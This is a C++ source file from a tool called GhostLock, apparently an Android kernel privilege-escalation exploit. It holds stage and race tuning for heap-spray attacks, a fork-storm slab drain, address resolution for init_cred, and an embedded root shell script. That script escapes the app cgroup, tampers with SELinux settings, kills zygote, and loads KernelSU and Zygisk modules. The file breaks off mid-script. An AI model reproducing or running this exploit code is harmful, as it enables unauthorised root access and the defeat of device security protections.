/*
 * GhostLock — attack primitives, launch/profile selection and timing.
 *
 * Split out of main.cpp so the orchestration entry stays a thin adapter. The
 * statement order and log text are unchanged from the original translation
 * unit.
 */

#include "attack/ops.hpp"
#include "support/fatal_error.hpp"

#include "session/exploit_session.hpp"

#include <algorithm>
#include <array>
#include <string>
#include <string_view>
#include <linux/perf_event.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/utsname.h>

namespace ghostlock::attack {
    void log_execution_settings(const profile::kernel_offsets *profile) {
        if (!profile) return;
        const profile::execution_settings *e = &profile->execution;
        const auto log_exec = [](const char *key, auto value) {
            pr_info("debug.execution.%s=%u\n", key, static_cast<unsigned>(value));
        };
        pr_info("debug.execution.begin release=%s\n", profile->uname_r);
        log_exec("recommended_cpus.main", e->recommended_main_cpu);
        log_exec("recommended_cpus.consumer", e->recommended_consumer_cpu);
        log_exec("selected_cpus.main", config::runtime_config_snapshot().main_cpu);
        log_exec("selected_cpus.consumer", config::runtime_config_snapshot().consumer_cpu);
        log_exec("heap.prepare_max_attempts", e->heap_prepare_max_attempts);
        log_exec("heap.prepare_timeout_ms", e->heap_prepare_timeout_ms);
        log_exec("heap.kernelsnitch_timeout_ms", e->heap_kernelsnitch_timeout_ms);
        log_exec("race.route_wait_ms", e->race_route_wait_ms);
        log_exec("race.setup_settle_us", e->race_setup_settle_us);
        log_exec("race.state_poll_interval_us", e->race_state_poll_interval_us);
        log_exec("stages.w1_attempts", e->w1_attempts);
        log_exec("stages.w1_settle_us", e->w1_settle_us);
        log_exec("stages.w1_scratch_repair_attempts", e->w1_scratch_repair_attempts);
        log_exec("stages.w2_attempts", e->w2_attempts);
        log_exec("stages.w2_settle_us", e->w2_settle_us);
        log_exec("stages.w3_chain_rounds", e->w3_chain_rounds);
        log_exec("stages.w3_attempts", e->w3_attempts);
        log_exec("stages.w3_settle_us", e->w3_settle_us);
        log_exec("routes.tcp_zerocopy.attempts", e->tcp_attempts);
        log_exec("routes.tcp_zerocopy.arm_sequence", e->tcp_arm_sequence);
        log_exec("routes.tcp_zerocopy.post_receive_hold_iterations",
                 e->tcp_post_receive_hold_iterations);
        log_exec("routes.select_stack.enter_delay_us", e->select_enter_delay_us);
        log_exec("routes.select_stack.timeout_us", e->select_timeout_us);
        log_exec("routes.select_stack.consumer_max_calls", e->select_consumer_max_calls);
        log_exec("routes.select_stack.consumer_burst_calls",
                 e->select_consumer_burst_calls);
        log_exec("handoff.pre_dispatch_settle_ms", e->handoff_pre_dispatch_settle_ms);
        log_exec("handoff.module_poll_attempts", e->handoff_module_poll_attempts);
        log_exec("handoff.module_poll_interval_ms", e->handoff_module_poll_interval_ms);
        log_exec("handoff.enforce_poll_attempts", e->handoff_enforce_poll_attempts);
        log_exec("handoff.enforce_poll_interval_ms", e->handoff_enforce_poll_interval_ms);
        pr_info("debug.execution.end\n");
    }

    /* Entries carry a phys load address only when measured; otherwise MTK uses
     * the DRAM base, xring its constant, qcom its GKI version. */
    void resolve_profile_addresses(void) {
        if (session::g_exploit_session.addresses.init(&session::g_exploit_session.profile) != 0)
            throw FatalError{};
        pr_info("soc: %s; kernel_phys_load=0x%llx\n",
                session::g_exploit_session.addresses.soc_name(&session::g_exploit_session.profile),
                (unsigned long long) session::g_exploit_session.addresses.phys_load());
        pr_info("init_cred image=%016zx alias=%016zx\n",
                (size_t) session::g_exploit_session.addresses.init_cred_image_addr(),
                (size_t) session::g_exploit_session.addresses.data_alias(
                    session::g_exploit_session.addresses.init_cred_image_addr()));
    }

    void install_profile(const profile::kernel_offsets &decoded) {
        struct utsname uts;
        if (uname(&uts) < 0) throw FatalError{};
        pr_info("kernel: %s\n", uts.release);
#ifdef TARGET_KERNEL_RELEASE
        if (std::string_view(uts.release) != TARGET_KERNEL_RELEASE) {
            pr_error("build requires kernel %s, got %s\n",
                     TARGET_KERNEL_RELEASE, uts.release);
            throw FatalError{};
        }
#endif
        if (!decoded.uname_r || std::string_view(decoded.uname_r) != uts.release) {
            pr_error("profile release mismatch: expected %s, got %s\n", uts.release,
                     decoded.uname_r ? decoded.uname_r : "<missing>");
            throw FatalError{};
        }
        /* PROFILE-SUGGEST-01: execution tuning arrives fully merged from Kotlin;
         * the native side only consumes the resolved values. */
        session::g_exploit_session.profile = profile::TargetProfile::from(&decoded);
        pr_success("resolved profile loaded: %s\n",
                   session::g_exploit_session.profile.release());
        if (config::runtime_config_snapshot().apply_profile(&session::g_exploit_session.profile) != 0)
            throw FatalError{};
        config::runtime_config_snapshot().log();
        log_execution_settings(session::g_exploit_session.profile.values());
        resolve_profile_addresses();
    }

    /* Lowest start and highest end of the System RAM banks in a /proc/iomem dump.
     * A nested bank lies inside its parent, so it cannot widen either bound. */
    static int32_t iomem_map_span(FILE *f, uint64_t *map_span) {
        unsigned long long base = 0, top = 0;
        char *line = nullptr;
        size_t cap = 0;
        int32_t found = 0;

        while (getline(&line, &cap, f) > 0) {
            size_t len = strlen(line);
            unsigned long long a, b;
            int32_t used = 0;

            while (len && (line[len - 1] == '\n' || line[len - 1] == '\r')) {
                line[--len] = '\0';
            }
            /* %n pins the match to the whole line, since sscanf returns 2 even when
             * a trailing literal mismatches */
            if (sscanf(line, " %llx-%llx : System RAM%n", &a, &b, &used) == 2 &&
                used == static_cast<int32_t>(len)) {
                if (!found || a < base) {
                    base = a;
                    found = 1;
                }
                if (b + 1 > top) top = b + 1;
            }
        }
        /* Kept as the C getline/free pair: the ScopeExit experiment grew
         * run_setup_stage by 5 instructions (CPP17 review, rejected). */
        free(line);

        /* the map starts at the dram base the kernel rounded down to a gib, which
         * is what memstart_addr holds */
        base &= ~((1ULL << 30) - 1);
        if (!found || top <= base) return 0;
        *map_span = top - base;
        return 1;
    }

    /* A rooted run leaves its /proc/iomem in the home dir, the only source for
     * this unit's direct map size. */
    void apply_iomem_cache(void) {
        std::array < char, 320 > path{};
        std::array < char, 192 > stamp{};
        uint64_t span = 0;
        int32_t ok = 0;
        const profile::kernel_offsets *values =
                session::g_exploit_session.profile.values();
        const char *release = values && values->uname_r ? values->uname_r : "";

        snprintf(path.data(), path.size(), "%s/.ghostlock_iomem", (config::runtime_config_snapshot().home_dir.c_str()));
        if (FILE *f = fopen(path.data(), "r")) {
            auto close_iomem = ghostlock::support::make_scope_exit(
                [f]() noexcept { fclose(f); });
            /* the first line names the release that wrote the dump */
            if (fgets(stamp.data(), static_cast<int32_t>(stamp.size()), f)) {
                /* strcspn returns an index inside the buffer; the store writes the
                 * terminating NUL at worst on the last byte. */
                stamp[strcspn(stamp.data(), "\r\n")] = '\0'; // NOLINT(clang-analyzer-security.ArrayBound)
                const std::string_view stamp_view(stamp.data());
                ok = stamp_view.starts_with("# ") &&
                     stamp_view.substr(2) == release &&
                     iomem_map_span(f, &span);
            }
        }

        /* the base is rounded down to a gib, so a span under that holds no real
         * bank, and the span has to cover the dram the unit reports. it also
         * stays inside the bound the built-in geometry already uses, so a measured
         * end can only narrow what this build would otherwise trust. an
         * unmeasurable ram rejects the dump */
        long pages = sysconf(_SC_PHYS_PAGES), page_sz = sysconf(_SC_PAGE_SIZE);
        uint64_t dram = (pages > 0 && page_sz > 0)
                            ? static_cast<uint64_t>(pages) * static_cast<uint64_t>(page_sz)
                            : 0;
        if (!ok || !dram || span < (1ULL << 30) || span < dram ||
            span >= kernel::DIRECT_MAP_END - kernel::DIRECT_MAP_BASE) {
            pr_info("iomem cache: no usable dump, keeping the built-in geometry\n");
            return;
        }

        kernel::g_direct_map_end = kernel::DIRECT_MAP_BASE + span;
        pr_info("iomem cache: direct_map_end=%016llx\n",
                (unsigned long long) kernel::g_direct_map_end);
    }

    void slab_drain(void) {
        /* Keep this light in untrusted_app. Aggressive fork storms trip LMK/OOM
         * (exit 137) especially right before heap spray. */
        struct timespec up;
        clock_gettime(CLOCK_BOOTTIME, &up);
        int32_t waves = (up.tv_sec > 60) ? 2 : 1;
        int32_t batch = (up.tv_sec > 60) ? 64 : 32;
        for (int32_t wave = 0; wave < waves; wave++) {
            /* Fixed upper bound (batch <= 64): no heap and no vector exception
             * paths in this pre-attack drain. */
            std::array<support::ChildProcess, 64> drain;
            int32_t n = 0;
            for (int32_t i = 0; i < batch; i++) {
                pid_t pid = fork();
                if (pid == 0) {
                    pause();
                    _exit(0);
                }
                if (pid > 0) {
                    if (n >= static_cast<int32_t>(drain.size())) break;
                    drain[static_cast<size_t>(n++)] = support::ChildProcess(pid);
                } else {
                    break;
                }
            }
            /* kill + reap in the original order, now owned by ChildProcess */
            for (int32_t i = 0; i < n; i++) (void) drain[static_cast<size_t>(i)].terminate_and_wait(SIGKILL);
            sched_yield();
            usleep(20000);
        }
    }

    void write_root_script(void) {
        std::string script(65536, '\0');
        support::UniqueFd sfd(
            open((config::runtime_config_snapshot().root_script_path.c_str()), O_WRONLY | O_CREAT | O_TRUNC, 0755));
        if (!sfd.valid()) {
            pr_warning("open root script failed path=%s errno=%d\n",
                       (config::runtime_config_snapshot().root_script_path.c_str()), errno);
            return;
        }

        /* The root phase exists to load KernelSU and nothing else. If it
         * carries a module list it enters the install branch, which runs
         * late-load before the install; late-load kills zygote and re-enforces
         * SELinux, so every later write to the app_data_file log/status is
         * denied and the run freezes at "installing". Force the list empty for
         * this phase regardless of what the caller passed. */
        const config::RuntimeConfig &runtime = config::runtime_config_snapshot();
        const char *lspd_modules = runtime.phase == "root"
            ? ""
            : runtime.lspd_modules_path.c_str();
        int32_t n = snprintf(
            script.data(), script.size(),
            "#!/system/bin/sh\n"
            "HOME_DIR='%s'\n"
            "LOG='%s'\n"
            "SAFE_MODE=%d\n"
            "KSUD='%s'\n"
            "LSPD_MODULES='%s'\n"
            "SELINUX_FIXUP='%s'\n"
            "PHASE='%s'\n"
            "STATUS=\"$HOME_DIR/.ghostlock_status\"\n"
            "RUN_ID=$(date +%%s 2>/dev/null)\n"
            "BOOT_ID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)\n"
            "STATE=starting\n"
            "BUSY=1\n"
            "READY=0\n"
            "ERROR=\n"
            "SUPERVISOR_PID=0\n"
            "write_status() {\n"
            "  { echo 'schema=1'; echo \"run_id=$RUN_ID\"; echo \"boot_id=$BOOT_ID\"; echo \"pid=$SUPERVISOR_PID\"; echo \"state=$STATE\"; echo \"busy=$BUSY\"; echo \"ready=$READY\"; echo \"error=$ERROR\"; echo \"log=$LOG\"; echo \"updated=$(date +%%s 2>/dev/null)\"; } >\"$STATUS.tmp\" && chmod 644 \"$STATUS.tmp\" 2>/dev/null\n"
            "  # The status and log live in the app-private dir but are written by a root\n"
            "  # shell: without an explicit owner/label fix the app cannot read them, and\n"
            "  # mv would also replace the inode that carries the SELinux context.\n"
            "  _u=$(stat -c %%u \"$HOME_DIR\" 2>/dev/null)\n"
            "  _c=$(ls -Zd \"$HOME_DIR\" 2>/dev/null | cut -d' ' -f1)\n"
            "  case \"$_c\" in u:*) ;; *) _c= ;; esac\n"
            "  if [ -n \"$_u\" ]; then chown \"$_u:$_u\" \"$STATUS.tmp\" \"$LOG\" 2>/dev/null; fi\n"
            "  if [ -n \"$_c\" ]; then chcon \"$_c\" \"$STATUS.tmp\" \"$LOG\" 2>/dev/null; fi\n"
            "  mv -f \"$STATUS.tmp\" \"$STATUS\" 2>/dev/null\n"
            "  if [ \"$STATE\" = \"ready\" ] || [ \"$STATE\" = \"failed\" ]; then rm -f \"$HOME_DIR/.ghostlock_run_started\" 2>/dev/null; fi\n"
            "}\n"
            "on_exit() {\n"
            "  RC=$?\n"
            "  if [ \"$RC\" -ne 0 ] && [ \"$STATE\" != \"failed\" ] && [ \"$STATE\" != \"ready\" ]; then\n"
            "    STATE=failed; BUSY=0; READY=0; ERROR=\"script exited $RC\"; write_status\n"
            "    echo \"[!] script exited $RC; marked failed\" >>\"$LOG\"\n"
            "  fi\n"
            "}\n"
            "trap on_exit EXIT\n"
            /* Escape the app's cgroup before doing anything else. This script is
             * forked from the app process, so it starts life in
             * /sys/fs/cgroup/apps/uid_<app>/pid_<n>. KernelSU's late-load kills
             * zygote, which takes the app down with it; the framework then tears
             * down that cgroup and SIGKILLs every task still in it. That killed
             * the supervisor mid-run at exactly the `kernelsu visible` poll
             * (on_exit never ran, so the status stayed at the last write). init
             * lives in the root cgroup, which nothing reclaims, so moving there
             * is what lets the supervisor outlive its parent. Measured: after
             * the move the process survives `am force-stop` of the app.
             * Android mounts the v1 controllers on their own trees
             * (/dev/cpuset, /dev/memcg, /dev/cpuctl, /dev/blkio), not under
             * /sys/fs/cgroup; a process only leaves top-app when every
             * controller accepts the move, so both hierarchies are written.
             * Best effort - a kernel without write access just keeps the old
             * behaviour. */
            "for CG in /sys/fs/cgroup/cgroup.procs \\\n"
            "         /dev/cpuset/cgroup.procs \\\n"
            "         /dev/memcg/cgroup.procs \\\n"
            "         /dev/cpuctl/cgroup.procs \\\n"
            "         /dev/blkio/cgroup.procs; do\n"
            "  [ -w \"$CG\" ] && echo \"$$\" >\"$CG\" 2>/dev/null\n"
            "done\n"
            "echo \"[*] root script start uid=$(id -u) euid=$(id -u) cgroup=$(cat /proc/self/cgroup 2>&1 | tr '\n' ' ')\" >\"$LOG\"\n"
            /* Baseline for the activate-phase readiness poll: the daemon may
             * only start once the framework has restarted, so a pid equal to
             * the one seen before any zygote kill means "old instance". */
            "SM_PRE=$(pidof system_server 2>/dev/null | tr -d '\\r' | awk '{print $1}')\n"
            "echo \"[*] system_server pre-restart pid=${SM_PRE:-none}\" >>\"$LOG\"\n"
            /* One-shot identity dump. uid=0 with full caps still failed to
             * create files in /data/adb, so the question is not "are we root"
             * but "whose /data are we looking at". mountinfo of the data
             * mount and the namespace inode answer that directly; without it
             * every later failure is guesswork. */
            "{\n"
            "  echo \"[*] id.full=$(id 2>&1)\"\n"
            "  echo \"[*] status.ids=$(grep -E '^(Uid|Gid|Groups|CapEff):' /proc/self/status | tr '\\n' ' ')\"\n"
            "  echo \"[*] ns.self.mnt=$(readlink /proc/self/ns/mnt 2>&1) ns.init.mnt=$(readlink /proc/1/ns/mnt 2>&1) ns.self.user=$(readlink /proc/self/ns/user 2>&1)\"\n"
            "  echo \"[*] adb.visible=$(ls -d /data/adb 2>&1) adbstat=$(stat -c '%%a %%u %%g' /data/adb 2>&1)\"\n"
            "} >>\"$LOG\" 2>&1\n"
            /* Snapshot pstore the moment we are uid 0, before late-load and
             * before anything that has been rebooting the device. The runs
             * that died left no readable /sys/fs/pstore behind (it needs
             * root, and root is gone after the reboot), so the panic text was
             * lost every time. /data/local/tmp survives the reboot. */
            "{\n"
            "  echo '=== pstore dump pre-late-load ==='\n"
            "  ls -l /sys/fs/pstore 2>&1\n"
            "  for f in /sys/fs/pstore/*; do\n"
            "    [ -f \"$f\" ] || continue\n"
            "    echo \"--- $f ($(wc -c <\"$f\" 2>/dev/null) bytes)\"\n"
            "    tail -c 65536 \"$f\" 2>&1\n"
            "  done\n"
            "} >/data/local/tmp/.ghostlock_pstore.txt 2>&1\n"
            "chmod 644 /data/local/tmp/.ghostlock_pstore.txt 2>/dev/null\n"
            "chown 2000:2000 /data/local/tmp/.ghostlock_pstore.txt 2>/dev/null\n"
            "echo \"[*] pstore snapshot bytes=$(wc -c </data/local/tmp/.ghostlock_pstore.txt 2>/dev/null)\" >>\"$LOG\"\n"
            /* Reboot correlation: after a death we can only tell "the device
             * rebooted" from "the run finished" by comparing these against the
             * post-mortem values. */
            "echo \"[*] pre-run boot_id=$BOOT_ID uptime=$(cat /proc/uptime 2>&1)\" >>\"$LOG\"\n"
            "chmod 644 \"$LOG\" 2>/dev/null\n"
            "if [ -f \"$STATUS\" ]; then\n"
            "  OLD_BOOT=$(sed -n 's/^boot_id=//p' \"$STATUS\" | head -1)\n"
            "  OLD_PID=$(sed -n 's/^pid=//p' \"$STATUS\" | head -1)\n"
            "  if [ \"$OLD_BOOT\" = \"$BOOT_ID\" ] && [ -n \"$OLD_PID\" ] && [ \"$OLD_PID\" != 0 ] && kill -0 \"$OLD_PID\" 2>/dev/null; then\n"
            "    if [ \"$PHASE\" = \"root\" ]; then\n"
            "      echo \"[!] supervisor already running pid=$OLD_PID; not starting another run\" >>\"$LOG\"\n"
            "      exit 0\n"
            "    fi\n"
            "    echo \"[*] stopping previous supervisor pid=$OLD_PID for $PHASE\" >>\"$LOG\"\n"
            "    kill -15 \"$OLD_PID\" 2>/dev/null\n"
            "    sleep 1\n"
            "    kill -9 \"$OLD_PID\" 2>/dev/null\n"
            "  fi\n"
            "fi\n"
            "write_status\n"
            "if [ \"$PHASE\" = \"reboot\" ]; then\n"
            "  echo '[*] soft reboot: root and modules stay loaded' >>\"$LOG\"\n"
            "  if [ \"$(id -u)\" != \"0\" ]; then\n"
            "    STATE=failed; BUSY=0; READY=0; ERROR='soft reboot needs root'; write_status\n"
            "    echo 'op:reboot fail: not root' >>\"$LOG\"\n"
            "    exit 1\n"
            "  fi\n"
            "  MP=$(pidof zygisk-ptrace64 2>/dev/null | awk '{print $1}')\n"
            "  TP=$(sed -n 's/^TracerPid:[[:space:]]*//p' /proc/1/status 2>/dev/null)\n"
            "  if [ -z \"$MP\" ] || [ \"$TP\" != \"$MP\" ]; then\n"
            "    STATE=failed; BUSY=0; READY=0; ERROR='rezygisk monitor not tracing init'; write_status\n"
            "    echo \"op:reboot fail: monitor=$MP init_tracer=$TP\" >>\"$LOG\"\n"
            "    exit 1\n"
            "  fi\n"
            "  P=$(pidof zygote64 2>/dev/null | tr -d '\\r' | awk '{print $1}')\n"
            "  if [ -z \"$P\" ]; then\n"
            "    STATE=failed; BUSY=0; READY=0; ERROR='zygote64 not found'; write_status\n"
            "    echo 'op:reboot fail: zygote64 not found' >>\"$LOG\"\n"
            "    exit 1\n"
            "  fi\n"
            "  STATE=soft_reboot; BUSY=1; READY=0; ERROR=; write_status\n"
            /* The zygote kill tears down every app process, including the
             * native binary that spawned this shell, so the tail of the
             * reboot has to survive it. Write a self-contained finisher,
             * start it detached under setsid, pass the log path, and
             * return. Without this the kill disconnects the caller and the
             * status file is left at state=soft_reboot forever
             * (measured 2026-11-10: zygote and Vector were healthy, the
             * status never advanced). */
            "  cat >/data/local/tmp/.ghostlock_reboot_finish.sh <<'RBFINEOF'\n"
            "#!/system/bin/sh\n"
            "export PATH=/system/bin:/system/xbin:$PATH\n"
            "LOG=\"$1\"\n"
            "HOME_DIR=${LOG%%/*}\n"
            "STATUS=\"$HOME_DIR/.ghostlock_status\"\n"
            "RUN_ID=$(sed -n 's/^run_id=//p' \"$STATUS\" 2>/dev/null | head -1)\n"
            "BOOT_ID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)\n"
            "SUPERVISOR_PID=$$\n"
            "STATE=soft_reboot\n"
            "BUSY=1\n"
            "READY=0\n"
            "ERROR=\n"
            "write_status() {\n"
            "  { echo 'schema=1'; echo \"run_id=$RUN_ID\"; echo \"boot_id=$BOOT_ID\"; echo \"pid=$SUPERVISOR_PID\"; echo \"state=$STATE\"; echo \"busy=$BUSY\"; echo \"ready=$READY\"; echo \"error=$ERROR\"; echo \"log=$LOG\"; echo \"updated=$(date +%%s 2>/dev/null)\"; } >\"$STATUS.tmp\" && chmod 644 \"$STATUS.tmp\" 2>/dev/null\n"
            "  # The status and log live in the app-private dir but are written by a root\n"
            "  # shell: without an explicit owner/label fix the app cannot read them, and\n"
            "  # mv would also replace the inode that carries the SELinux context.\n"
            "  _u=$(stat -c %%u \"$HOME_DIR\" 2>/dev/null)\n"
            "  _c=$(ls -Zd \"$HOME_DIR\" 2>/dev/null | cut -d' ' -f1)\n"
            "  case \"$_c\" in u:*) ;; *) _c= ;; esac\n"
            "  if [ -n \"$_u\" ]; then chown \"$_u:$_u\" \"$STATUS.tmp\" \"$LOG\" 2>/dev/null; fi\n"
            "  if [ -n \"$_c\" ]; then chcon \"$_c\" \"$STATUS.tmp\" \"$LOG\" 2>/dev/null; fi\n"
            "  mv -f \"$STATUS.tmp\" \"$STATUS\" 2>/dev/null\n"
            "  if [ \"$STATE\" = \"ready\" ] || [ \"$STATE\" = \"failed\" ]; then rm -f \"$HOME_DIR/.ghostlock_run_started\" 2>/dev/null; fi\n"
            "}\n"
            "finisher_exit() {\n"
            "  RC=$?\n"
            "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
            "  echo '[*] finisher: setenforce 1 (restore enforcing)' >>\"$LOG\"\n"
            "  if [ \"$RC\" -ne 0 ] && [ \"$STATE\" != \"failed\" ] && [ \"$STATE\" != \"ready\" ]; then\n"
            "    STATE=failed; BUSY=0; READY=0; ERROR=\"reboot finisher exited $RC\"; write_status\n"
            "    echo \"[!] reboot finisher exited $RC; marked failed\" >>\"$LOG\"\n"
            "  fi\n"
            "}\n"
            "trap finisher_exit EXIT\n"
            "P=$(pidof zygote64 2>/dev/null | tr -d '\\r' | awk '{print $1}')\n"
            "if [ -z \"$P\" ]; then\n"
            "  STATE=failed; BUSY=0; READY=0; ERROR='zygote64 not found'; write_status\n"
            "  echo 'op:reboot fail: zygote64 not found' >>\"$LOG\"\n"
            "  exit 1\n"
            "fi\n"
            "rm -f /data/adb/rezygisk/state.json\n"
            "echo \"op:reboot kill: zygote64 pid=$P\" >>\"$LOG\"\n"
            "kill -9 \"$P\"\n"
            "i=0\n"
            "while [ $i -lt 120 ]; do\n"
            "  if [ -f /data/adb/rezygisk/state.json ] && grep -q '\"64\": 1' /data/adb/rezygisk/state.json; then\n"
            "    break\n"
            "  fi\n"
            "  sleep 1\n"
            "  i=$((i+1))\n"
            "done\n"
            "if [ $i -ge 120 ]; then\n"
            "  STATE=failed; BUSY=0; READY=0; ERROR='zygote injection timeout'; write_status\n"
            "  echo 'op:reboot fail: zygote injection timeout' >>\"$LOG\"\n"
            "  exit 1\n"
            "fi\n"
            "if [ ! -x /data/adb/modules/zygisk_vector/daemon ]; then\n"
            "  STATE=failed; BUSY=0; READY=0; ERROR='Vector daemon missing'; write_status\n"
            "  echo 'op:reboot fail: Vector daemon missing' >>\"$LOG\"\n"
            "  exit 1\n"
            "fi\n"
            "if [ -z \"$(pidof vectord)\" ]; then\n"
            "  echo '[*] vectord gone; restarting it after system_server settles' >>\"$LOG\"\n"
            "  sleep 60\n"
            "  nohup unshare -m /data/adb/modules/zygisk_vector/daemon --system-server-max-retry=3 >/data/local/tmp/vectord.log 2>&1 &\n"
            "  chown 2000:2000 /data/local/tmp/vectord.log 2>/dev/null\n"
            "fi\n"
            "CLI_OK=0; STATE_OK=0; i=0\n"
            "while [ $i -lt 12 ]; do\n"
            "  if [ $CLI_OK = 0 ] && timeout 15 /data/adb/modules/zygisk_vector/cli status 2>&1 | grep -q 'Framework Version'; then\n"
            "    CLI_OK=1\n"
            "  fi\n"
            "  if [ $STATE_OK = 0 ] && grep -q 'zygisk_vector' /data/adb/rezygisk/state.json 2>/dev/null; then\n"
            "    STATE_OK=1\n"
            "  fi\n"
            "  if [ $CLI_OK = 1 ] && [ $STATE_OK = 1 ]; then break; fi\n"
            "  sleep 5\n"
            "  i=$((i+1))\n"
            "done\n"
            "if [ \"$CLI_OK\" = 1 ] && [ \"$STATE_OK\" = 1 ]; then\n"
            "  STATE=ready; BUSY=0; READY=1; ERROR=; write_status\n"
            "  echo 'op:reboot ok' >>\"$LOG\"\n"
            "  exit 0\n"
            "fi\n"
            "STATE=failed; BUSY=0; READY=0; ERROR='Vector verify failed'; write_status\n"
            "echo 'op:reboot fail: Vector verify failed' >>\"$LOG\"\n"
            "exit 1\n"
            "RBFINEOF\n"
            "  chmod 755 /data/local/tmp/.ghostlock_reboot_finish.sh\n"
            "  chown 2000:2000 /data/local/tmp/.ghostlock_reboot_finish.sh 2>/dev/null\n"
            "  setsid sh /data/local/tmp/.ghostlock_reboot_finish.sh \"$LOG\" </dev/null >/dev/null 2>&1 &\n"
            "  exit 0\n"
            "fi\n"
            "touch /data/local/tmp/.ghostlock_vector_managed 2>/dev/null\n"
            "chown 2000:2000 /data/local/tmp/.ghostlock_vector_managed 2>/dev/null\n"
            "if touch /data/adb/ghostlock-vector-managed 2>/dev/null; then\n"
            "  echo '[*] managed marker pre-created' >>\"$LOG\"\n"
            "else\n"
            "  echo '[!] cannot pre-create /data/adb marker' >>\"$LOG\"\n"
            "fi\n"
            "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
            /* The shell that runs the module scripts lands in u:r:kernel:s0 with
             * no CAP_MAC_ADMIN, so every domain switch is refused. Record caps
             * and enforcement once, up front: together they separate "policy
             * too tight" from "exploit creds are only partial". */
            "echo \"[*] caps=$(grep Cap /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
            "echo \"[*] enforce=$(cat /sys/fs/selinux/enforce 2>&1)\" >>\"$LOG\"\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu.pr*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu-*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/org.bakasu.bakasu-*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/com.kowx712.supermanager*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ -z \"$KSUD\" ]; then KSUD=/data/local/tmp/ksud; fi\n"
            "if [ ! -x \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
            "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
            "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
            "cp \"$KSUD\" /data/local/tmp/.ghostlock_ksud 2>/dev/null\n"
            "chmod 755 /data/local/tmp/.ghostlock_ksud 2>/dev/null\n"
            "chown 2000:2000 /data/local/tmp/.ghostlock_ksud 2>/dev/null\n"
            "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
            "if [ \"$(id -u)\" -ne 0 ]; then\n"
            "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
            "  exit 1\n"
            "fi\n"
            "echo \"# $(uname -r)\" >\"$HOME_DIR/.ghostlock_iomem.new\"\n"
            "if cat /proc/iomem >>\"$HOME_DIR/.ghostlock_iomem.new\" 2>/dev/null && grep -q 'System RAM' \"$HOME_DIR/.ghostlock_iomem.new\"; then\n"
            "  mv \"$HOME_DIR/.ghostlock_iomem.new\" \"$HOME_DIR/.ghostlock_iomem\"\n"
            "  chmod 644 \"$HOME_DIR/.ghostlock_iomem\" 2>/dev/null\n"
            "  echo \"[*] iomem cache: cached $(wc -c <\"$HOME_DIR/.ghostlock_iomem\") bytes\" >>\"$LOG\"\n"
            "else\n"
            "  rm -f \"$HOME_DIR/.ghostlock_iomem.new\"\n"
            "  echo '[!] iomem cache: /proc/iomem read failed' >>\"$LOG\"\n"
            "fi\n"
            "if [ -d /sys/fs/pstore ]; then\n"
            "  mkdir -p \"$HOME_DIR/pstore\" 2>/dev/null\n"
            "  cp /sys/fs/pstore/* \"$HOME_DIR/pstore/\" 2>/dev/null\n"
            "  PSN=$(ls \"$HOME_DIR/pstore\" 2>/dev/null | wc -l)\n"
            "  [ \"$PSN\" -gt 0 ] && echo \"[*] pstore captured files=$PSN\" >>\"$LOG\"\n"
            "fi\n"
            "DEBUG_DIR=\"%s\"\n"
            "dump_debug() {\n"
            "  [ -n \"$DEBUG_DIR\" ] || return 0\n"
            "  if ! mkdir -p \"$DEBUG_DIR/pstore\" 2>/dev/null; then\n"
            "    DEBUG_DIR=/data/local/tmp/ghostlock-debug-$$.d; mkdir -p \"$DEBUG_DIR/pstore\" 2>/dev/null || return 0\n"
            "  fi\n"
            "  {\n"
            "    echo '== uname -a =='\n"
            "    uname -a\n"
            "    echo '== /proc/version =='\n"
            "    cat /proc/version\n"
            "    echo '== /proc/cmdline =='\n"
            "    cat /proc/cmdline\n"
            "    echo '== /proc/modules =='\n"
            "    cat /proc/modules\n"
            "    echo '== selinux =='\n"
            "    getenforce 2>/dev/null\n"
            "  } >\"$DEBUG_DIR/kernel-info.txt\" 2>&1\n"
            "  if ! dmesg >\"$DEBUG_DIR/kernel-dmesg.log\" 2>&1; then\n"
            "    echo '[!] dmesg unavailable' >>\"$DEBUG_DIR/kernel-dmesg.log\"\n"
            "  fi\n"
            "  for f in /sys/fs/pstore/*; do\n"
            "    [ -f \"$f\" ] || continue\n"
            "    cp \"$f\" \"$DEBUG_DIR/pstore/\" 2>/dev/null\n"
            "  done\n"
            "  cp /proc/iomem \"$DEBUG_DIR/iomem.txt\" 2>/dev/null\n"
            "  cp \"$LOG\" \"$DEBUG_DIR/ksu.log\" 2>/dev/null\n"
            "  echo \"[*] debug dump written to $DEBUG_DIR\" >>\"$LOG\"\n"
            "  chown -R 2000:2000 \"$DEBUG_DIR\" 2>/dev/null\n"
            "}\n"
            "# W1's 64-bit child pointer makes adjacent booleans non-zero.\n"
            "echo 0 > /sys/fs/selinux/checkreqprot 2>/dev/null\n"
            "if grep -q '^kernelsu[[:space:]]' /proc/modules 2>/dev/null; then\n"
            "  echo '[+] KernelSU already loaded' >>\"$LOG\"\n"
            "fi\n"
            "KVER=$(uname -r | cut -d. -f1-2)\n"
